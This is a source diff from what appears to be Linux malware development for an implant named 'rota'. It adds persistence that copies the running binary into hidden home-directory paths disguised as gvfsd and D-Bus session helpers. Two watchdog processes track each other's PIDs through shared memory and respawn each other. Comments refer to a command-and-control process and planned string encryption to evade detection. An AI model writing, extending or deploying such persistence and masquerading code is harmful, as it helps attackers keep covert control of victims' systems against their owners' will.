@@ -22,7 +22,7 @@ bool copy_rota_to_userland(char *destpath) {
     stat("/proc/self/exe", &procstru);
     fsize = procstru.st_size;
     char *exe = (char *)malloc(fsize);
-    memset(exe,0, fsize);
+    memset(exe, 0, fsize);
 
     // copy data from /proc/self/exe into exe buffer.
     int fd  = open("/proc/self/exe", O_RDONLY);
@@ -34,6 +34,7 @@ bool copy_rota_to_userland(char *destpath) {
     int bytesWritten = write(fout, exe, fsize);
     free(exe);
 
+    close(fout);
     // if bytes written == size of file
     if (bytesWritten == fsize) {
         return true;
@@ -127,10 +128,10 @@ bool nonroot_desktop_persistence() {
 
     // -------- copy userland binary now -------------
     //
-    // copy rota binary
+    // copy rota binary to /home/$USER/.fvfsd/.profile/gvfsd-helper
     // TODO convert gvfsd_helper into char array
     // TODO decrypt and rotate char array below
-    //
+
     char *gvfsd_helper= "/.gvfsd/.profile/gvfsd-helper";
     fpath_size = strlen(HOME) + strlen(gvfsd_helper);
     char *binpath = (char *)malloc(fpath_size);
@@ -173,14 +174,73 @@ bool nonroot_desktop_persistence() {
         }
     }
 
-    // write rota binary to persistence location.
-    bool rota_write = copy_rota_to_userland(binpath);
+    // write rota binary to /home/$USER/.gvfsd/.profile/gvfsd.
+    bool rota_write_gvfsd = copy_rota_to_userland(binpath);
 
-    if (rota_write == false) {
-        fprintf(stderr, "\n[rota]Error writing rota to %s.\tError : %s",
+    if (rota_write_gvfsd == false) {
+        fprintf(stderr, "\n[rota] Error writing rota to %s.\tError : %s",
                 binpath, strerror(errno));
     }
 
+    // -------- copy userland binary now -------------
+    //
+    // copy rota binary to /home/$USER/.dbus/sessions/session-dbus
+    // TODO convert session-dbus into an encrypted char array
+    // TODO decrypt and rotate char array below
+
+    char *session_dbus= "/.dbus/sessions/session-dbus";
+    fpath_size = strlen(HOME) + strlen(session_dbus);
+    char *binpath_session_dbus = (char *)malloc(fpath_size);
+    memset(binpath_session_dbus, 0, fpath_size);
+
+    strncat(binpath_session_dbus, HOME, strlen(HOME));
+    strncat(binpath_session_dbus, session_dbus, strlen(session_dbus));
+
+    char *dbus_dir = "/.dbus";
+    dirpath_size = strlen(HOME) + strlen(dbus_dir);
+    char *dbus_path = (char *)malloc(dirpath_size);
+    memset(dbus_path, 0, dirpath_size);
+
+    strncat(dbus_path, HOME, strlen(HOME));
+    strncat(dbus_path, dbus_dir, strlen(dbus_dir));
+
+    // if directory does not exist create it.
+    if (access(dbus_dir, F_OK) == -1) {
+        int res = mkdir(dbus_path, 0755);
+        if (res != 0) {
+            #ifdef DEBUG
+            fprintf(stderr, "\n[sessions/session-dbus] Error creating directory to %s\tError: %s\n",
+                dirpath_profile, strerror(errno));
+            #endif
+        }
+    }
+
+    char *dbus_sessions_dir = "/.dbus/sessions";
+    dirpath_size = strlen(HOME) + strlen(dbus_sessions_dir);
+    char *dbus_session_path = (char *)malloc(dirpath_size);
+    memset(dbus_session_path, 0, dirpath_size);
+
+    strncat(dbus_session_path, HOME, strlen(HOME));
+    strncat(dbus_session_path, dbus_sessions_dir, strlen(dbus_sessions_dir));
+
+    // if directory does not exist create it.
+    if (access(dbus_session_path, F_OK) == -1) {
+        int res = mkdir(dbus_session_path, 0755);
+        if (res != 0) {
+            #ifdef DEBUG
+            fprintf(stderr, "\n[sessions/session-dbus] Error creating directory to %s\tError: %s\n",
+                dirpath_profile, strerror(errno));
+            #endif
+        }
+    }
+
+    // write rota binary to /home/$USER/.dbus/sessions/session-dbus
+    bool rota_write_session_dbus = copy_rota_to_userland(binpath_session_dbus);
+
+    if (rota_write_session_dbus == false) {
+        fprintf(stderr, "\n[rota]Error writing rota to %s.\tError : %s",
+                binpath, strerror(errno));
+    }
 
     free(fpath);
     free(binpath);
@@ -258,20 +318,22 @@ bool root_persistence(void) {
 }
 
 
-bool monitor_proc(char *pid) {
+bool monitor_proc(int *pid) {
 
+    char *c_pid = (char *)malloc(sizeof(pid));
     char *procpath = "/proc/";
 
-    int size_procpath = strlen(procpath) + strlen(pid);
+    int size_procpath = strlen(procpath) + sizeof(pid);
     char *finalpath = (char *)malloc(size_procpath);
     memset(finalpath, 0, size_procpath);
 
+    sprintf(c_pid, "%d", *pid); // convert pid int to char
+
     strncpy(finalpath, procpath, strlen(procpath));
-    strncat(finalpath, pid, strlen(pid));
-    // variable finalpath is now /proc/<PID>
+    strncat(finalpath, c_pid, strlen(c_pid));
+    // variable "finalpath" is now /proc/<PID>
 
     int res = access(finalpath, F_OK);
-    //free(pid);
     free(finalpath);
     if (res == 0 ) {
         return true; // file exists
@@ -291,109 +353,159 @@ void fork_exec(char *fpath) {
                 strerror(errno));
         #endif
         exit(1);
-    }
-    if (res == 0){
+    } else if (res == 0){
         // child process to execvp;
         execvp(fpath, NULL);
+    } else {
+        waitpid(res, &wstatus, 0);
     }
-
-    waitpid(res, &wstatus, 0);
-
 }
 
 
-void *watchdog_process_shmget(void *fpath) {
+void *watchdog_process_shmget() {
+    // stop defunct processes from showing up
+    signal(SIGCHLD, SIG_IGN);
+
+    // detach from current console, and make systemd the parent
+    //daemon(0,0);
 
     bool proc_alive;
     int pid = getpid();
-    char *c_pid = (char *)malloc(sizeof(int));
-    memset(c_pid, 0, sizeof(int));
-    sprintf(c_pid, "%d", pid);
 
     // obtain PID from shared memory
-    int shmid = shmget(0x64b2e2, 8, IPC_CREAT |0666);
+    int shmid = shmget(0x64b2e2, 8, IPC_CREAT | 0666);
     if (shmid <= 0) {
-        #ifdef DEBUG
-        fprintf(stderr, "\n[wathcdog_process_shmget] Error getting shared memory : %s\n", strerror(errno));
-        #endif
-        fork_exec(fpath);
+        fprintf(stderr, "\n[wathcdog_process_shmget](%d) Error getting shared memory : %s\n",
+                getpid(),
+                strerror(errno));
+        sleep(5);
+        // recurisvely call watchdog in the event IPC shmem creation fails.
+        //watchdog_process_shmget(fpath);
     }
 
     // write PID to sharedmem
-    void *addr = shmat(shmid, NULL, 0);
-    memcpy(addr, c_pid, 8);
+    int *addr = (int *)shmat(shmid, NULL, 0);
+    memcpy(addr, &pid, 4);
     sleep(10);
+
     // TODO - stackstring + AES + ROR here
-    //
     do {
 
+        // get handle to shared mem
+        int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);
+
+        // get "upper bytes" from shmem
+        int upper_bytes = *(shmem_pid_addr+4);
+
+        #ifdef DEBUG
+        fprintf(stdout,"[watchdog_process_shmget] PID from shared memory is: %d current pid is: %d\n",
+                upper_bytes,
+                getpid());
+        #endif
+
         //  check /proc/<PID> exists....
-        // get pid from shared memory.
-        char *shmem_pid_addr = shmat(shmid, NULL, 0);
-        proc_alive = monitor_proc(shmem_pid_addr);
+        proc_alive = monitor_proc(&upper_bytes);
 
         //if proc not there, exec into existence
         if (proc_alive == false) {
-            #ifdef DEBUG
-            fprintf(stderr, "[shmget] process is not alive! spawning\n");
-            #endif
-            fork_exec(fpath);
+            fprintf(stderr, "[watchdog_process_shmget](%d) process %d is not alive! spawning\n",
+                    getpid(),
+                    upper_bytes);
+
+            // TODO - stack string file path  and dynamically resolve it.
+            char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.dbus/sessions/session-dbus", "&", NULL}; // NULL terminated array of char* strings
+            int f_pid = fork();
+            if (f_pid == 0) {
+                execvp("/bin/sh", argument_list);
+            }
+            close(f_pid);
         }
 
-        sleep(3);
+        sleep(5);
     } while(true);
 
-    if (fpath != NULL) {
-        free(fpath);
-    }
+
 
     // detatch from process
     pthread_detach(pthread_self());
 }
 
 
-void *watchdog_process_shmread(void *fpath) {
+void *watchdog_process_shmread() {
+    // stop defunct processes from showing up
+    signal(SIGCHLD, SIG_IGN);
+
+    // detatch from console, making systemd parent.
+    // daemon(0,0);
 
     bool proc_alive;
 
     do {
-        int shmid = shmget(0x64b2e2, 8, IPC_CREAT | 0666);
+        // session bus runs this function to montior the main C2 process within gvfsd-helper.
+        int shmid = shmget(0x64b2e2, 8, 0666);
         if (shmid <= 0) {
             #ifdef DEBUG
-            fprintf(stderr, "\n[wathcdog_process_shmread] %s\n", strerror(errno));
+            fprintf(stderr, "\n[watchdog_process_shmread](%d) %s\n", getpid(), strerror(errno));
             #endif
-            fork_exec(fpath);
         }
+
+
+        // write PID to sharedmem
+        int pid = getpid();
+        int *addr = shmat(shmid, NULL, 0);
+        memcpy(addr+4, &pid, 4); // copy to "upper half" of 8 bytes.:
+
+        #ifdef DEBUG
+        fprintf(stdout, "\n[wathcdog_process_shmread] wrote %d to shared memory\n", getpid());
+        #endif
+
         // get pid from shared memory.
-        char *shmem_pid_addr = shmat(shmid, NULL, 0);
-        proc_alive = monitor_proc(shmem_pid_addr);
+        int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);
+        // TODO - parse out mem from lower 4 bytes.
+        int *tmpPid = (int *)malloc(4);
+        memset(tmpPid, 0, 4);
+        memcpy(tmpPid, shmem_pid_addr, 4);
+        proc_alive = monitor_proc(tmpPid);
+
+        #ifdef DEBUG
+        printf("[watchdog_process_shmread] PID obtained from shmem is %d, current pid is %d\n",
+               *tmpPid,
+               getpid());
+        #endif
 
         //if proc pid entry not there, exec into existence
         if (proc_alive == false) {
             #ifdef DEBUG
-            fprintf(stderr, "[shmread] process is not alive! spawning\n");
+            fprintf(stderr, "[shmread] (%d) process id %d is not alive! spawning\n", getpid(), *tmpPid);
             #endif
-            fork_exec(fpath);
-        }
-        // if process dies execute
-        if (access(fpath, F_OK) != 0) {
-            fork_exec(fpath);
+
+            // TODO - stack string file path  and dynamically resolve it.
+            char* argument_list[] = {"/bin/sh", "-c", "/home/gdev/.gvfsd/.profile/gvfsd-helper", "&", NULL}; // NULL terminated array of char* strings
+
+            int f_pid = fork();
+            if (f_pid == 0) {
+                execvp("/bin/sh", argument_list);
+            }
+            close(f_pid);
         }
 
         sleep(3);
     } while(true);
 
-    pthread_detach(pthread_self());
+   pthread_detach(pthread_self());
 }
 
-
-void spawn_thread_watchdog(int uid, char *fpath) {
+void spawn_thread_watchdog(int uid) {
     pthread_t threadid;
     if (uid == 0){
-        // "the parent thread"
-        pthread_create(&threadid, NULL, watchdog_process_shmget, fpath);
+        // the "parent thread" monitors session-dbus
+        //pthread_create(&threadid, NULL, watchdog_process_shmget, fpath);
+         watchdog_process_shmget();
+
+        // testing
     } else {
-        // "the child thread"
-        pthread_create(&threadid, NULL, watchdog_process_shmread, fpath);
+        // the "child thread" monitors gvfsd-helper
+        // pthread_create(&threadid, NULL, watchdog_process_shmread, fpath);
+        watchdog_process_shmread();
     }
 }
